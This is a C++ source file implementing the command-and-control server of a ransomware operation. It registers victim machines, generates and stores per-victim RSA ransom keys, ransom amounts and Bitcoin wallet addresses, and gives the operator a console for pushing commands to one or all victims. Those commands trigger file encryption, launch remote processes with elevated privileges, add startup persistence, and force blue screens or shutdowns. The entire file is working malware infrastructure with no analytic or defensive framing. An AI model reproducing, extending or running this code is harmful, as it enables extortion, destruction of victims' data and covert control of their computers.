#include "ServerInterface.h"
#include "Serialization.h"
#include "NetworkManager.h"
#include "External/base64.h"
#include "Logging.hpp"

#include <iostream>
#include <fstream>
#include <chrono>

Packet CreateKeepAlivePacket() {
    Packet packet;
    packet.action = kKeepAlive;
    packet.code = kResponseOk;
    packet.valid = true;
    packet.insert("hello reverse engineer."); // if you can see this ;)

    return packet;
}

/*
    packet flag description
    for printing info about the flag
*/
struct PacketFlagInfo {
    std::string description;
    unsigned int flag;
};

/*
    possible commands to perform on the client
    from the server
*/
const std::map<Action, std::string> ServerCommands =
{
    { kOpenRemoteProcess, "Open a remote process." },
    { kPingClient,        "Send a ping to a remote host." },
    { kRemoteBSOD,        "Cause a BSOD on the client." },
    { kRemoteShutdown,    "Shutdown the clients machine." },
    { kKillClient,        "Forcefully disconnect the client from the C2 server." },
    { kRansomwareEnable,  "Run ransomware on the client." },
    { kAddToStartup,      "Add a program to the startup registry."}
};

/*
    possible flags you can include in your command
    includes a short description, name as a string to check for input
    and the actual value of the flag
*/
const std::map<std::string, PacketFlagInfo> ServerCommandFlags =
{
    { "NO_CONSOLE",          {"Run command with no console opened.",                                NO_CONSOLE} },
    { "RUN_AS_HIGHEST",      {"Run command with highest privileges on remote host.",                RUN_AS_HIGHEST} },
    { "RUN_AS_NORMAL",       {"Run command with current privileges on remote host.",                RUN_AS_NORMAL} },
    { "USE_CLI",             {"Run command using cmd.exe.",                                            USE_CLI} },
    { "RESPOND_WITH_STATUS", {"Remote host will respond to server after the command is performed.", RESPOND_WITH_STATUS } },
    { "PACKET_IS_A_COMMAND", {"This request is something that should be performed on the client.",  PACKET_IS_A_COMMAND} }
};

/**
 * Create two server instances, one to represent TCP and another to represent UDP.
 * 
 * \param UDPPort - the port to listen for UDP messages on
 * \param TCPPort - the port to make a TCP server on
 */
ServerInterface::ServerInterface(int UDPPort, int TCPPort) {
    this->m_ServerLogs.CreateLog(this->m_Config.serverLogPath, "server_log");
    this->m_ServerLogs.Log("------------ SERVER SESSION STARTED ------------");

    this->m_TCPServerDetails = NewServerInstance(TCP, TCPPort);    
    this->m_UDPServerDetails = NewServerInstance(UDP, UDPPort);
    this->m_ServerLogs.Log("Server interfaces created (TCP and UDP)");
    this->m_SessionKeys = LGCrypto::GenerateRSAPair(4096);
}

/**
 * Check if a server is running if so, shut it down.
 * Afterwords, clean up WSA.
 */
ServerInterface::~ServerInterface() {
    if ( this->m_TCPServerDetails.alive )
        ShutdownServer(true);

    CleanWSA();
    this->m_ServerLogs.Log("------------ SERVER SESSION ENDED ------------");
    this->m_ServerLogs.CloseLog(this->m_ServerLogs.log_output_path, this->m_ServerLogs.log_output_filename);
}

/**
 * Send the server session public key to client 'cuid' and receive their
 * public key as well, so that the server has the clients public key
 * and the client has the servers public key.
 * 
 * \param cuid - the client unique identifier of the client to exchange keys with
 * \return TRUE or FALSE whether or not keys were exchanged successfully.
 */
bool ServerInterface::ExchangeCryptoKeys(long cuid) {
    Client* client = GetClientPtr(cuid);
    if ( !client )
        return false;

    // convert our public key to der format
    int            len = i2d_RSAPublicKey(this->m_SessionKeys.pub, nullptr); // len of pub key in der format
    unsigned char* data = NULL; // public key as der format

    i2d_RSAPublicKey(this->m_SessionKeys.pub, &data);
    

    // send session public key
    int sent = Send(client->GetSocket(), ( char* ) &len, sizeof(len), 0); // Send size of private key first
    if ( sent <= 0 ) {
        free(data);
        return false;
    }

    sent = Send(client->GetSocket(), ( char* ) data, len, 0); // send der format of rsa key
    if ( sent <= 0 ) {
        free(data);
        return false;
    }
    std::cout << "sent session key" << std::endl;

    // send ransom public key
    len = i2d_RSAPublicKey(client->GetRansomSecrets().pub, nullptr);
    data = NULL;
    i2d_RSAPublicKey(client->GetRansomSecrets().pub, &data);

    sent = Send(client->GetSocket(), ( char* ) &len, sizeof(len), 0); // Send size of private key first
    if ( sent <= 0 ) {
        free(data);
        return false;
    }
    std::cout << "sent size of ransom key" << std::endl;

    sent = Send(client->GetSocket(), ( char* ) data, len, 0); // send der format of rsa key
    if ( sent <= 0 ) {
        free(data);
        return false;
    }
    std::cout << "sent ransom key" << std::endl;

    // now receive the public key
    int            clientLen = 0;
    unsigned char* clientDer = NULL;

    int received = Receive(client->GetSocket(), ( char* ) &clientLen, sizeof(clientLen), 0);
    if ( received <= 0 ) {
        free(data);
        return FALSE;
    }

    clientDer = ( unsigned char* ) malloc(clientLen);
    received = Receive(client->GetSocket(), ( char* ) clientDer, clientLen, 0);
    if ( received <= 0 ) {
        free(data);
        free(clientDer);
        return FALSE;
    }

    const unsigned char* constDer = clientDer;

    RSA* rsaPubKey = d2i_RSAPublicKey(nullptr, &constDer, clientLen);

    client->ClientPublicKey = rsaPubKey;

    // send aes key encoded with base64 and encrypted with client public key
    std::string base64Aes      = macaron::Base64::Encode(Serialization::BytestringToString(client->GetAESKey()));
    BYTESTRING serialized      = Serialization::SerializeString(base64Aes);
    BYTESTRING encryptedB64AES = LGCrypto::RSAEncrypt(serialized, client->ClientPublicKey, FALSE);
    m_NetworkManager.TransmitData(encryptedB64AES, client->GetSocket(), TCP);

    free(data);
    free(clientDer);
    return true;
}


/**
 * Receive messages on UDP socket. 
 * Interperet them as 'ClientRequest' structs. 
 * Afterwards, perform the action requested. 
 */
void ServerInterface::ListenForUDPMessages() {

    // UDP requests are not encrypted.
    sockaddr_in recvAddr;
    int addrSize = sizeof(recvAddr);

    // receive while udp server is alive
    while ( this->m_UDPServerDetails.alive == TRUE ) {
        Packet        req;
        sockaddr_in   incomingAddr;
        
        BOOL received = m_NetworkManager.ReceiveData(req, this->m_UDPServerDetails.sfd, UDP, incomingAddr);
        if ( !received )
            continue;
        
        PerformRequest(req, this->m_UDPServerDetails, -1, incomingAddr);
    }
}

/**
 * Read the server state file as json and return the file contents.
 * 
 * \return File contents as a JSON type
 */
JSON ServerInterface::ReadServerStateFile() noexcept {
    JSON parsed;

    if ( !std::filesystem::exists(ReadConfig().serverStateFullPath) ) {
        std::ofstream create(ReadConfig().serverStateFullPath);
        return parsed; // file is gonna be empty so theres no good information
    }

    std::fstream input(ReadConfig().serverStateFullPath, std::fstream::in | std::fstream::out | std::fstream::app);

    if ( std::filesystem::is_empty(ReadConfig().serverStateFullPath) )
        return parsed;
    
    input >> parsed;
    return parsed;
}

/**
 * Get a clients save file from the server state file by using the clients Machine GUID.
 * Note: the client of 'cuid' must have it's MachineGUID field filled out.
 * 
 * \param cuid - required to lookup existing data for the client
 * \return Client* - the client pointer object with all fields filled out
 *  with the most update information from the server state file
 */
Client* ServerInterface::GetClientSaveFile(long cuid) {
    Client* client = GetClientPtr(cuid);
    std::string machineGUID = client->GetMachineGUID();

    if ( !IsClientInSaveFile(machineGUID) )
        return {};

    JSON data = ReadServerStateFile();
    if ( data.empty() )
        return nullptr;

    if ( !data.contains("client_list") )
        return nullptr;

    JSON JSONClientInfo = data["client_list"][machineGUID];
    client->SetDesktopName(JSONClientInfo["computer_name"]);
    client->RansomAmountUSD = JSONClientInfo["ransom_payment_usd"];
    client->SetMachineGUID(JSONClientInfo["machine_guid"]); 

    RSAKeys secrets;
    std::string savedPrivateKey = "";
    std::string savedPublicKey = "";

    macaron::Base64::Decode(JSONClientInfo["ransom_keys_b64"]["rsa_public_key"], savedPublicKey);
    macaron::Base64::Decode(JSONClientInfo["ransom_keys_b64"]["rsa_private_key"], savedPrivateKey);

    secrets.pub = LGCrypto::RSAKeyFromString(savedPublicKey);
    secrets.priv = LGCrypto::RSAKeyFromString(savedPrivateKey);

    client->SetRansomSecrets(secrets);
    client->UniqueBTCWalletAddress = JSONClientInfo["unique_btc_wallet"];

    return client;
}

/**
 * Save information about this->m_TCPServerDetails to a file stored on the servers machine as JSON.
 * 
 * \return TRUE if no errors occured.
 */
bool ServerInterface::SaveServerState() {
    m_ClientListMutex.lock();

    JSON data = ReadServerStateFile();
    data["server_info"] = {
        {"connections",           this->m_ClientList.size()},
        {"max_connections",    ReadConfig().maxConnections},
        {"server_state_path",  ReadConfig().serverStateFullPath},
        {"server_config_path", ReadConfig().serverConfigFilePath},
        {"udp_port",           ReadConfig().UDPPort},
        {"tcp_port",           ReadConfig().TCPPort},
        {"tcp_dns",            ReadConfig().domainName},
    };
    
    for ( auto& iter : this->m_ClientList ) {
        Client client = iter.second;
        data["client_list"][client.GetMachineGUID()] = {
            { "computer_name", client.GetDesktopName()},
            { "machine_guid", client.GetMachineGUID()},
            { "client_id", client.ClientUID },
            { "unique_btc_wallet", client.UniqueBTCWalletAddress },
            { "ransom_payment_usd", client.RansomAmountUSD },
        };
        data["client_list"][client.GetMachineGUID()]["ransom_keys_b64"] = {
            { "rsa_public_key", macaron::Base64::Encode(LGCrypto::RSAKeyToString(client.GetRansomSecrets().pub, FALSE)) },
            { "rsa_private_key", macaron::Base64::Encode(LGCrypto::RSAKeyToString(client.GetRansomSecrets().priv, TRUE)) },
        };
    }

    std::ofstream outFile(ReadConfig().serverStateFullPath);
    outFile << std::setw(4) << data << std::endl;
    outFile.close();

    m_ClientListMutex.unlock();
    return true;
}

void ServerInterface::ShutdownServer(bool confirm) {
    if ( !confirm ) return;

    this->m_TCPServerDetails.alive = FALSE;
    ShutdownSocket(this->m_TCPServerDetails.sfd, 2); // shutdown server socket for both read and write
    CloseSocket(this->m_TCPServerDetails.sfd);
    this->m_TCPServerDetails = {}; // set server details to new blank server structure
    this->m_ServerLogs.Log("Shutting down TCP server");
}

/**
 * Perform a request based on the action.
 * 
 * \param req - a 'ClientRequest' sent from a client over a socket
 * \param on - The server to perform the request on
 * \param cuid - The cuid of the sender of the request
 * \param incoming - Optional sockaddr_in to send a reply back if 'on' is a UDP server
 * \return 
 */
bool ServerInterface::PerformRequest(const Packet& req, Server on, long cuid, sockaddr_in incoming) {
    if ( !req.valid ) 
        return false;
    
    bool    success = false;
    bool    onTCP   = ( on.type == SOCK_STREAM ); // TRUE = performing on tcp server, FALSE = performing on udp
    Client* TCPClient = nullptr;

    if ( onTCP ) 
        TCPClient = GetClientPtr(cuid);

    switch ( req.action )
    {
    case Action::kClientWantsToDisconnect:
        SaveServerState();

        this->m_ClientListMutex.lock();
        this->m_ClientList.erase(cuid);
        this->m_ClientListMutex.unlock();
        
        TCPClient->Disconnect();
        TCPClient = nullptr;
        success = true;
        break;
    // connect client to tcp server on udp request
    case Action::kAddClientToServer: 
    {
        if ( onTCP ) // already connected
            break;

        // client wants to connect so respond with tcp server details
        hostent* host = GetHostByName(DNS_NAME.c_str());

        // server with ip inserted into addr for the client to connect to
        // allows me to change the dns name to whatever i want, whenever
        Server temp = this->m_TCPServerDetails;
        memcpy(&temp.addr.sin_addr, host->h_addr_list[0], host->h_length);

        success = m_NetworkManager.TransmitData(temp, this->m_UDPServerDetails.sfd, UDP, incoming);

        break;
    }
    }

    return success;
}

void ServerInterface::OnKeepAliveEcho(long cuid, Packet& packet) {
    Client* client = GetClientPtr(cuid);
    if ( !client )
        return;

    if ( packet.action == kKeepAlive ) {
        client->KeepAliveSuccess = TRUE;
        client->KeepAliveProcess = FALSE;
        return;
    }

    client->KeepAliveSuccess = FALSE;
    client->KeepAliveProcess = FALSE;
}


void ServerInterface::SendKeepAlivePackets(long cuid) {
    Client* client = GetClientPtr(cuid);
    if ( !client )
        return;

    Packet toSend = CreateKeepAlivePacket();

    do {
        client->KeepAliveSuccess = FALSE;

        BYTESTRING encryptedOriginal = LGCrypto::EncryptStruct(toSend, client->GetAESKey(), LGCrypto::GenerateAESIV());

        m_NetworkManager.SetSocketTimeout(client->GetSocket(), ReadConfig().keepAliveTimeoutMs, SO_SNDTIMEO);
        
        int size = encryptedOriginal.size();
        int sentBytes = Send(client->GetSocket(), ( char* ) &size, sizeof(size), 0);
       
        if ( sentBytes <= 0 ) {
            std::cout << "Error sending keep-alive packet. Removing client..." << std::endl;
            RemoveClientFromServer(client);
            break;
        }

        sentBytes = Send(client->GetSocket(), ( char* ) encryptedOriginal.data(), size, 0);
        
        m_NetworkManager.ResetSocketTimeout(client->GetSocket(), SO_SNDTIMEO);
        if ( sentBytes <= 0 ) {
            std::cout << "Error sending keep-alive packet. Removing client..." << std::endl;
            RemoveClientFromServer(client);
            break;
        }

        client->KeepAliveProcess = TRUE;

        unsigned int timePassedMs = 0;

        // sleep for timeout
        // while keep alive process is in progress
        // and while success is false
        do {
            Sleep(100);
            timePassedMs += 100;
        } while ( timePassedMs < ReadConfig().keepAliveTimeoutMs && client->KeepAliveSuccess == FALSE && client->KeepAliveProcess == TRUE );

        client->KeepAliveProcess = FALSE;

        if ( client->KeepAliveSuccess == FALSE ) {
            std::cout << "Client failed to respond to keep-alive packet." << std::endl;
            RemoveClientFromServer(client);
            break;
        }

        Sleep(ReadConfig().keepAliveIntervalMs);
    } while ( client->Alive );
}

/**
 * Receive TCP messages from a client and perform requests based on those messages.
 * 
 * \param cuid - the cuid of the client to receive messages from
 */
void ServerInterface::TCPReceiveMessagesFromClient(long cuid) {
    Client* client = GetClientPtr(cuid);

    if ( client == nullptr )
        return;

    PingClient(cuid);

    // tcp receive main loop
    do
    {
        if ( client->ExpectingResponse ) {
            Sleep(100);
            continue;
        }

        BYTESTRING encrypted;
        Packet     packet = {0};

        bool received = m_NetworkManager.ReceiveTCPLargeData(encrypted, client->GetSocket());
        if ( !received )
            continue;
        
        packet = LGCrypto::DecryptToStruct<Packet>(encrypted, client->GetAESKey());

        if ( client->KeepAliveProcess == TRUE ) {
            OnKeepAliveEcho(client->ClientUID, packet);
            continue;
        }

        if ( packet.code == kNotAResponse )
            PerformRequest(packet, this->m_TCPServerDetails, cuid);
        else {
            std::cout << std::endl;
            std::cout << client->ClientUID << " sent a message!" << std::endl;
            std::cout << packet.buffer << std::endl;
        }

    } while ( client->Alive && client->GetSocket() != INVALID_SOCKET );

    std::cout << "Client is not alive... No longer receiving messages" << std::endl;
}

/**
 * Accept incoming client connection requests for the TCP server.
 * 
 */
void ServerInterface::AcceptTCPConnections() {
    if ( this->m_TCPServerDetails.accepting ) // already accepting connections
        return;

    this->m_TCPServerDetails.accepting = TRUE;
    std::cout << "Accepting connections on the TCP server." << std::endl;

    while ( this->m_ClientList.size() <= 200 && this->m_TCPServerDetails.alive == TRUE )
    {
        // accept
        sockaddr_in addr = {};
        int size = sizeof(sockaddr_in);
        
        SOCKET clientSocket = AcceptOnSocket(this->m_TCPServerDetails.sfd, reinterpret_cast<sockaddr*>( &addr ), &size);
        if ( clientSocket == INVALID_SOCKET )
            continue;

        OnTCPConnection(clientSocket, addr);
        this->m_ServerLogs.Log("A client joined the TCP server");
    }

    // stopped accepting connections. this function is now done.
    this->m_TCPServerDetails.accepting = FALSE;
}

/**
 * Create a client instance for a TCP connection and exchange rsa public keys.
 * 
 * \param connection - the socket file descriptor for the client TCP connection
 * \param incoming - incoming network address from the client
 */
void ServerInterface::OnTCPConnection(SOCKET connection, sockaddr_in incoming) {
    Client     client(connection, incoming);                  // create the client. generate the cuid
    RSAKeys    ransomKeys = LGCrypto::GenerateRSAPair(2048); // generate rsa keys for the client
    BYTESTRING aesKey     = LGCrypto::Generate256AESKey();
    
    std::cout << "client connected" << std::endl;

    client.SetRansomSecrets(ransomKeys);
    client.SetAESKey(aesKey);
    
    AddToClientList(client);              // add them to the client list
    ExchangeCryptoKeys(client.ClientUID); // send server public key, get their public key

    GetClientComputerName(client.ClientUID);
    GetClientMachineGUID(client.ClientUID);
    
    //if ( ClientIsInClientList(client.GetMachineGUID()) ) {
    //    std::cout << "Client is already connected" << std::endl;
    //    RemoveClientFromServer(&client);
    //    return;
    //}

    if ( IsClientInSaveFile(client.GetMachineGUID()) )
        GetClientSaveFile(client.ClientUID);

    SaveServerState();

    // create a thread to receive messages from the client
    std::thread receive(&ServerInterface::TCPReceiveMessagesFromClient, this, client.ClientUID);
    receive.detach();

    Sleep(5000);

    std::thread keepAlive(&ServerInterface::SendKeepAlivePackets, this, client.ClientUID);
    keepAlive.detach();
}

unsigned int ServerInterface::GetFlagsFromInput(const std::string& s) {
    unsigned int flags = 0;
    for ( auto& [flagName, flagInfo] : ServerCommandFlags ) {
        if ( s.find(flagName) == std::string::npos )
            continue;
        flags |= flagInfo.flag;
    }
    return flags;
}

bool ServerInterface::HandleUserInput(unsigned int command, Packet& outputCommand) {
    bool performed = false;
    Packet cmdInfo = {};
    cmdInfo.action = static_cast<Action>(command);

    switch ( command ) {
    case Action::kRansomwareEnable: {
        std::string input;
        std::string confirmation;

        std::cout << "Path to start searching files: ";
        std::getline(std::cin, input);

        std::cout << "Are you sure (YES or NO): ";
        std::getline(std::cin, confirmation);

        if ( confirmation != "YES" )
            break;

        cmdInfo.flags |= PACKET_IS_A_COMMAND;
        cmdInfo.insert(input);

        performed = true;
        break;
    }
    case Action::kOpenRemoteProcess: {
        std::string input;

        std::cout << "Arguments for " << kOpenRemoteProcess << ": ";
        std::getline(std::cin, input);

        std::cout << "Input name of flags: ";
        std::string flagInput;
        std::getline(std::cin, flagInput);

        cmdInfo.flags = GetFlagsFromInput(flagInput);
        cmdInfo.insert(input);

        performed = true;
        break;
    }
    case Action::kKillClient:
        cmdInfo.flags = PACKET_IS_A_COMMAND | NO_CONSOLE;
        cmdInfo.action = Action::kKillClient;
        cmdInfo.buffLen = 0;
        performed = true;
        break;
    case Action::kAddToStartup: {
        std::string input;
        std::cout << "Path of program to add to startup: ";
        std::getline(std::cin, input);
        
        cmdInfo.insert(input);

        performed = true;
        break;
    }
    case Action::kRemoteShutdown: {
        std::string input;
        std::cout << "reboot OR shutdown: ";
        std::getline(std::cin, input);
        std::cout << input << std::endl;

        if ( input == "restart" )
            cmdInfo.insert("restart");
        else if ( input == "shutdown" )
            cmdInfo.insert("shutdown");
        else
            break;

        cmdInfo.flags = PACKET_IS_A_COMMAND | NO_CONSOLE;

        performed = true;
        break;
    }
    case Action::kRemoteBSOD:
        cmdInfo.flags = PACKET_IS_A_COMMAND | NO_CONSOLE;
        performed = true;
        break;
    case Action::kPingClient:
        performed = true;
        break;
    }

    if ( !performed )
        return false;

    outputCommand = cmdInfo;

    return performed;
}

void ServerInterface::SendCommandsToClients() {
    std::thread send(&ServerInterface::RunUserInputOnClients, this);
    send.detach();
}

void ServerInterface::RemoveClientFromServer(Client* client) {
    if ( client->Alive == FALSE || !ClientIsInClientList(client->ClientUID) )
        return;

    client->Alive = FALSE;
    client->Disconnect();

    this->m_ClientList.erase(client->ClientUID);
    this->m_ServerLogs.Log("A client disconnected from the TCP server. CUID: " + client->ClientUID);
}

void ServerInterface::OutputServerCommands() {
    std::cout << "Showing possible server commands:\n";
    for ( auto& [val, info] : ServerCommands ) {
        std::cout << "\t[" << val << "] - " << info << std::endl;
    }
}

Packet ServerInterface::WaitForClientResponse(Client* client) {

    client->ExpectingResponse = TRUE;
    m_NetworkManager.SetSocketTimeout(5, client->GetSocket(), TCP);

    BYTESTRING encrypted;
    Packet response;

    m_NetworkManager.SetSocketTimeout(client->GetSocket(), 10000, SO_RCVTIMEO);
    bool received = m_NetworkManager.ReceiveTCPLargeData(encrypted, client->GetSocket());
    m_NetworkManager.ResetSocketTimeout(client->GetSocket(), SO_RCVTIMEO);

    if ( GetLastError() == WSAETIMEDOUT ) {
        response.code = ClientResponseCode::kTimeout;
        return response;
    }

    if ( !received )
        return {};

    response = LGCrypto::DecryptToStruct<Packet>(encrypted, client->GetAESKey());
    client->ExpectingResponse = FALSE;

    return response;
}

bool ServerInterface::IsServerCommand(long command) {
    return ServerCommands.contains(static_cast<Action>(command));
}

void ServerInterface::OutputClientList() {
    std::cout << "Showing all (" << this->m_ClientList.size() << ") connected clients:" << std::endl;
    std::cout << "CUID  | Name            | Machine GUID" << std::endl;
    for ( auto& [cuid, client] : this->m_ClientList )
        std::cout << cuid << " - " << client.GetDesktopName() << " - " << client.GetMachineGUID() << std::endl;
}

void ServerInterface::RunUserInputOnClients() {
    while ( this->m_TCPServerDetails.alive ) {
        // select which client to run command on
        std::string  clientID;    
        long         lClientID     = 0;
        Client*      client        = nullptr;
        BOOL         performed     = FALSE;
        BOOL         globalCommand = FALSE; // perform command on all clients
        Action       lCommand      = kNone;
        BOOL         sent          = FALSE;
        std::string  command;
        int          performees = 0;

        std::cout << std::endl;
        OutputClientList();
        std::cout << std::endl;
        std::cout << "[Client ID to perform command on; 0 for all]: ";
        std::getline(std::cin, clientID);
        
        try {
            if ( (lClientID = std::stol(clientID)) == 0 )
                globalCommand = TRUE;
        } catch ( std::invalid_argument ) {
            std::cout << "Input Error; Invalid input." << std::endl;
            system("pause");
            system("cls");
            continue;
        } catch ( std::out_of_range ) {
            std::cout << "Input Error; Number too large" << std::endl;
            system("pause");
            system("cls");
            continue;
        }

        if ( !globalCommand ) {
            client = GetClientPtr(std::stol(clientID));
            if ( !client ) {
                system("cls");
                continue;
            }
        }
        
        this->OutputServerCommands();

        std::cout << "[# Command to perform]: ";
        std::getline(std::cin, command);

        try {
            lCommand = static_cast<Action>(std::stol(command));
        } catch ( std::invalid_argument& err ) {
            std::cout << "Input Error; Invalid input." << std::endl;
            system("pause");
            system("cls");
            continue;
        } catch ( std::out_of_range& err ) {
            std::cout << "Input Error; Number too large" << std::endl;
            system("pause");
            system("cls");
            continue;
        }

        if ( !IsServerCommand(lCommand) ) {
            std::cout << "Invalid command; " << lCommand << " Not a command" << std::endl;
            system("pause");
            system("cls");
            continue;
        }
         
        Packet toSend;
        BOOL userInput = HandleUserInput(lCommand, toSend); // fill packet with info
        if ( !userInput ) {
            std::cout << "Error taking user input." << std::endl;
            system("pause");
            system("cls");
            continue;
        }

        if ( !globalCommand ) {
            BYTESTRING encrypted = LGCrypto::EncryptStruct(toSend, client->GetAESKey(), LGCrypto::GenerateAESIV());

            sent = m_NetworkManager.TransmitData(encrypted, client->GetSocket(), TCP);

            if ( toSend.action == kKillClient )
                RemoveClientFromServer(client);
        } else {
            for ( auto& [ cuid, host ] : this->m_ClientList ) {
                if ( host.Alive == FALSE )
                    continue;

                BYTESTRING encrypted = LGCrypto::EncryptStruct(toSend, host.GetAESKey(), LGCrypto::GenerateAESIV());
                sent = m_NetworkManager.TransmitData(encrypted, host.GetSocket(), TCP);

                if ( !sent ) {
                    std::cout << "There was an error sending your command. Is the client alive?" << std::endl;
                    std::cout << "Details: \n";
                    std::cout << "Recipient CUID:         " << host.ClientUID << std::endl;
                    std::cout << "Recipient Machine GUID: " << host.GetMachineGUID() << std::endl;
                    std::cout << "Recipient Desktop Name: " << host.GetDesktopName() << std::endl;
                    std::cout << "Sent packet size:       " << encrypted.size() << " bytes" << std::endl;
                }
                else
                    performees++;

                if ( toSend.action == kKillClient ) {
                    Sleep(100);
                    RemoveClientFromServer(&host);
                }
            }
            std::cout << "Performed command on " << std::to_string(performees) << " clients." << std::endl;
        }
        system("pause");
        system("cls");
    }
}

/**
 * Receive a remote clients Windows Machine GUID over the TCP server.
 * 
 * \param cuid - the cuid of the client whom we are to receive the machine GUID from.
 * \return TRUE if no errors occured; otherwise FALSE
 */
bool ServerInterface::GetClientMachineGUID(long cuid) {
    Client* client = GetClientPtr(cuid);

    BYTESTRING machienGUID;
    bool received = m_NetworkManager.ReceiveData(machienGUID, client->GetSocket(), TCP);
    if ( !received )
        return false;

    BYTESTRING decrypted = LGCrypto::RSADecrypt(machienGUID, this->m_SessionKeys.priv, TRUE);
    if ( !LGCrypto::GoodDecrypt(decrypted) )
        return false;

    std::string machineGuid = Serialization::BytestringToString(decrypted);
    client->SetMachineGUID(machineGuid);
    return true;
}

/**
 * Receive a remote clients Windows computer name.
 * 
 * \param cuid - the cuid of the client whom we are to receive their computer name from.
 * \return TRUE if no errors occured; otherwise FALSE
 */
bool ServerInterface::GetClientComputerName(long cuid) {
    Client* client = GetClientPtr(cuid);

    BYTESTRING computerNameSerialized;
    bool received = m_NetworkManager.ReceiveData(computerNameSerialized, client->GetSocket(), TCP);
    if ( !received )
        return false;

    BYTESTRING decrypted = LGCrypto::RSADecrypt(computerNameSerialized, this->m_SessionKeys.priv, TRUE);
    if ( !LGCrypto::GoodDecrypt(decrypted) )
        return false;

    std::string computerName = Serialization::BytestringToString(decrypted);
    client->SetDesktopName(computerName);
    return true;
}

/**
 * Create a 'Server' struct with all fields filled out for a communication protocal.
 * Also create a socket and store it in the 'sfd' field.
 * 
 * \param serverType - the type of server to make, TCP or UDP
 * \param port - the port the server shall run on
 * \return 'Server' structure with all fields filled out and a valid socket based on the server type.
 */
Server ServerInterface::NewServerInstance(SocketTypes serverType, int port) {    
    Server server = {};

    // create socket for server type
    // update server fields
    if ( serverType == TCP ) {
        server.sfd = CreateSocket(AF_INET, SOCK_STREAM, 0);
        if ( server.sfd == INVALID_SOCKET )
            return server;

        server.type = SOCK_STREAM;
        m_Config.TCPPort = port;

        SetSocketOptions(server.sfd, SOL_SOCKET, SO_RCVBUF, ( char* ) &MAX_BUFFER_LEN, sizeof(MAX_BUFFER_LEN));
        SetSocketOptions(server.sfd, SOL_SOCKET, SO_SNDBUF, ( char* ) &MAX_BUFFER_LEN, sizeof(MAX_BUFFER_LEN));

    } else if ( serverType == UDP) {
        server.sfd = CreateSocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if ( server.sfd == INVALID_SOCKET )
            return server;
        
        server.type = SOCK_DGRAM;
        m_Config.UDPPort = port;
    }
    
    server.addr.sin_addr.s_addr = INADDR_ANY;
    server.addr.sin_family      = AF_INET;
    server.addr.sin_port        = HostToNetworkShort(port);
    server.port                 = port;
    server.alive = TRUE;
    server.accepting = FALSE;

    return server;
}

/**
 * Start a server by relying on the details provided in a 'Server' structure.
 * Create a thread afterwards (either AcceptTCPConnections or ListenForUDPMessages) depending on the server type.
 * 
 * \param server - the details of the server to start
 * \return TRUE if the server has started, FALSE if otherwise
 */
bool ServerInterface::StartServer(Server& server) {
    if ( server.sfd == INVALID_SOCKET )
        return false;

    // bind
    int status = SOCKET_ERROR;
    status = BindSocket(server.sfd, ( sockaddr* ) &server.addr, sizeof(server.addr));
    if ( status == SOCKET_ERROR )
        return false;

    server.alive = TRUE;

    // listen if TCP server
    if ( server.type == SOCK_STREAM ) {
        status = SocketListen(server.sfd, SOMAXCONN);
        if ( status == SOCKET_ERROR )
            return false;

        this->m_TCPServerDetails = server;

        // start accepting
        std::thread acceptThread(&ServerInterface::AcceptTCPConnections, this);
        acceptThread.detach(); // run accept thread even after this function returns

        this->SendCommandsToClients();
        this->m_ServerLogs.Log("TCP server accepting");
    }
    // otherwise if not tcp server then listen for udp messaages
    else if ( server.type == SOCK_DGRAM ) {
        this->m_UDPServerDetails = server;

        std::thread receiveThread(&ServerInterface::ListenForUDPMessages, this);
        receiveThread.detach(); 
        this->m_ServerLogs.Log("UDP 'server' listening.");
    }

    return true;
}

/**
 * Wait for a response from a client after a ServerCommand was sent.
 * 
 * \param cuid - the cuid of the client to receive a response from
 * \return 'ClientResponse' sent to the server from the client
 */
Packet ServerInterface::WaitForClientResponse(long cuid) {
    Client* client = GetClientPtr(cuid);
    if ( !client ) {
        return {};
    }

    return this->WaitForClientResponse(client);
}

/**
 * Get a pointer to a client from the servers client list.
 * 
 * \param cuid - the cuid of the client to get
 * \return Client* class that represents the client, or nullptr if error.
 */
Client* ServerInterface::GetClientPtr(long cuid) {
    if ( !ClientIsInClientList(cuid) ) return nullptr;
    return &this->m_ClientList.at(cuid);
}

/**
 * Get the servers client list. Lock the ClientListMutex beforehand.
 * 
 * \return this->ClientList
 */
std::unordered_map<long, Client>& ServerInterface::GetClientList() {
    std::lock_guard<std::mutex> lock(m_ClientListMutex);
    return this->m_ClientList;
}

/**
 * Check if a client's machine guid is in the server save file client list.
 * 
 * \param machineGUID - the machine GUID to try and find
 * \return TRUE or FALSE whether or not the machine guid is found in the file
 */
bool ServerInterface::IsClientInSaveFile(const std::string& machineGUID) {
    JSON file = ReadServerStateFile();
    if ( !file.empty() && file.contains("client_list") ) {
        return file["client_list"].contains(machineGUID);
    }

    return false;
}

/**
 * Ping a client over TCP and receive a response if possible.
 * TODO: make a timeout so that receive doesnt hang
 * 
 * \param cuid - the cuid of the client to ping
 * \return A 'ClientResponse' sent to the server from the pinged client
 */
Packet ServerInterface::PingClient(long cuid) {
    if ( !ClientIsInClientList(cuid) )
        return {};

    Client* client = GetClientPtr(cuid);
    if ( client->GetSocket() == INVALID_SOCKET ) // socket isnt ready so cant ping.
        return {};

    // send the ping to the client over tcp
    Packet pingCommand;
    pingCommand.action  = Action::kPingClient;
    pingCommand.flags   = RESPOND_WITH_STATUS | PACKET_IS_A_COMMAND;
    pingCommand.buffLen = 0;

    //std::cout << "Pinging " << client->GetDesktopName() << " with " << sizeof(pingCommand) << " bytes of data." << std::endl;
    BYTESTRING encrypted = LGCrypto::EncryptStruct(pingCommand, client->GetAESKey(), LGCrypto::GenerateAESIV());

    BOOL sent = m_NetworkManager.SendTCPLargeData(encrypted, client->GetSocket());
    if ( !sent )
        return {};

    client->ExpectingResponse = TRUE;

    //auto start = std::chrono::high_resolution_clock::now();
    Packet response = WaitForClientResponse(client);
    //auto end = std::chrono::high_resolution_clock::now();
    
    if ( response.code == ClientResponseCode::kTimeout )
        //std::cout << "- Request timed out." << std::endl;
        return {};
    else if ( response.code == ClientResponseCode::kResponseError )
        //std::cout << "- Request failed." << std::endl;
        return {};
    

    //std::cout << "- Reply from " << client->GetDesktopName() << ". Code " << response.code << ". ";

    //auto dur = end - start;
    //long long final = std::chrono::duration_cast<std::chrono::milliseconds>(dur).count();
    
    //std::cout << "Took " << final << " ms" << std::endl;

    return response;
}

/**
 * Check whether or not cuid is in this->ClientList.
 * 
 * \param cuid - the cuid to check if it is in the client list
 * \return TRUE if the cuid is in the client list, otherwise FALSE
 */
bool ServerInterface::ClientIsInClientList(long cuid) {
    return GetClientList().contains(cuid);
}

